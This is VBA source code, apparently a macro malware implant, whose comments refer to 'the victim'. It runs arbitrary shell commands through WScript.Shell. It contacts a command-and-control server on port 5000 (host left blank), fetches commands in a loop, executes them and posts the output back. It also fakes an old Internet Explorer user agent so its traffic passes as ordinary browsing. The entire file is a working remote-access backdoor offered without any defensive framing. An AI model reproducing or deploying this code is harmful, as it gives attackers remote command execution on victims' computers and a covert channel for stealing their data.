'function for running commands on the victim
Function RunCommand(command As String) As String

    'handle errors
    On Error GoTo error
    
    'create Shell
    Set WshShell = CreateObject("Wscript.Shell")
    
    'execute the command from the new shell
    Set WshShellExec = WshShell.Exec(command)
    
    'read the output of the command
    RunCommand = WshShellExec.StdOut.ReadAll
    
Done:
        Exit Function
        'error handling
error:
        RunCommand = "ERROR"
End Function



'Function to send data to the server
Function SendToServer(data As String)
    
    On Error GoTo error
    
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    
    ' Add address of the webserver
    Url = "http://:5000"
    
    'send data as POST request
    objHTTP.Open "POST", Url, False
    
    'set user agent to look more like natural traffic
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    
    'send the data
    objHTTP.send (data)

Done:
        Exit Function
    'error handling
error:
        MsgBox ("Cannot connect to server (Send to Server function)")
End Function


Function StartC2()
    Dim replyTXT As String
    
    'error handling
    On Error GoTo error
    
    data = "START"
    
    'start loop of receive+run new commands, stop the session when STOP is received
    Do While replyTXT <> "STOP"
    
        'send command result ot server, similar to SendToServer
        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

        ' Add address of the webserver
        Url = "http://:5000"
        objHTTP.Open "POST", Url, False
        'set user agent to look more like natural traffic
        objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    
        'send the data
        objHTTP.send (data)
        
        'receive the new command from the response
        replyTXT = objHTTP.responseText
        
        'run the new command
        data = RunCommand(replyTXT)
        
        
    'continue the loop of receive and run new commands
    Loop

Done:
        Exit Function
        'error handling
error:
        MsgBox ("Cannnot connect to server (StartC2 function)")
        
End Function
